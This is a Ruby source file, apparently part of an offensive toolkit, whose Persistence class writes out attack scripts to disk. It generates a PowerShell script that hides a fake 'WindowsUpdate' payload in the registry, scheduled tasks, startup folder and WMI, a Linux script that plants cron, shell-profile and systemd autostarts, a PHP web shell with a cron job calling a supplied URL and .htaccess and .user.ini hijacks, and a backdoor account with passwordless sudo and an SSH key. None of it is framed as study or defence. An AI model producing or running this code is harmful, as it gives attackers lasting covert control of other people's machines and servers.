require_relative '../utils/colorize'

class Persistence
  def self.generate_windows_persistence
    persistence = <<~PS1
      $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      $regName = "WindowsUpdate"
      $regValue = "$env:TEMP\\update.exe"
      Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
      
      $taskName = "WindowsUpdateTask"
      $action = New-ScheduledTaskAction -Execute "$env:TEMP\\update.exe"
      $trigger = New-ScheduledTaskTrigger -AtLogOn
      $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
      Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
      
      $startup = [Environment]::GetFolderPath("Startup")
      Copy-Item "$env:TEMP\\update.exe" "$startup\\update.exe" -Force
      
      $wmi = Get-WmiObject -Class Win32_StartupCommand
      $wmi.Create("$env:TEMP\\update.exe", "WindowsUpdate", "$env:TEMP", 4)
    PS1
    
    filename = "windows_persistence_#{Time.now.to_i}.ps1"
    File.write(filename, persistence)
    puts Colorize.green("Windows persistence script saved: #{filename}")
    filename
  end

  def self.generate_linux_persistence
    persistence = <<~SH
      #!/bin/bash
      
      echo "*/5 * * * * $HOME/.update.sh" | crontab -
      
      cat > $HOME/.update.sh << 'EOF'
      #!/bin/bash
      /tmp/update.sh
      EOF
      
      chmod +x $HOME/.update.sh
      
      echo "/tmp/update.sh" >> $HOME/.bashrc
      echo "/tmp/update.sh" >> $HOME/.profile
      echo "/tmp/update.sh" >> $HOME/.zshrc
      
      if [ -f /etc/systemd/system/update.service ]; then
        systemctl disable update.service
      fi
      
      cat > /etc/systemd/system/update.service << 'EOF'
      [Unit]
      Description=Update Service
      After=network.target
      
      [Service]
      Type=simple
      ExecStart=/tmp/update.sh
      Restart=always
      
      [Install]
      WantedBy=multi-user.target
      EOF
      
      systemctl enable update.service
      systemctl start update.service
    SH
    
    filename = "linux_persistence_#{Time.now.to_i}.sh"
    File.write(filename, persistence)
    File.chmod(filename, 0755)
    puts Colorize.green("Linux persistence script saved: #{filename}")
    filename
  end

  def self.generate_web_shell_persistence(url, shell_path)
    persistence = <<~PHP
      <?php
      $shell_path = '#{shell_path}';
      $shell_content = '<?php system($_GET["c"]); ?>';
      
      file_put_contents($shell_path, $shell_content);
      
      $cron = "*/5 * * * * curl #{url}?c=id\n";
      file_put_contents('/tmp/cron', $cron, FILE_APPEND);
      exec('crontab /tmp/cron');
      
      $htaccess = "AddHandler application/x-httpd-php .txt\n";
      file_put_contents('.htaccess', $htaccess);
      
      $ini = "auto_prepend_file = #{shell_path}\n";
      file_put_contents('.user.ini', $ini);
      ?>
    PHP
    
    filename = "web_persistence_#{Time.now.to_i}.php"
    File.write(filename, persistence)
    puts Colorize.green("Web persistence script saved: #{filename}")
    filename
  end

  def self.generate_backdoor_account(username, password)
    backdoor = <<~SH
      #!/bin/bash
      
      useradd -m -s /bin/bash #{username}
      echo "#{username}:#{password}" | chpasswd
      
      usermod -aG sudo #{username}
      usermod -aG wheel #{username}
      usermod -aG docker #{username}
      
      echo "#{username} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
      
      mkdir -p /home/#{username}/.ssh
      echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." > /home/#{username}/.ssh/authorized_keys
      chmod 600 /home/#{username}/.ssh/authorized_keys
      chown -R #{username}:#{username} /home/#{username}/.ssh
    SH
    
    filename = "backdoor_account_#{Time.now.to_i}.sh"
    File.write(filename, backdoor)
    File.chmod(filename, 0755)
    puts Colorize.green("Backdoor account script saved: #{filename}")
    filename
  end
end

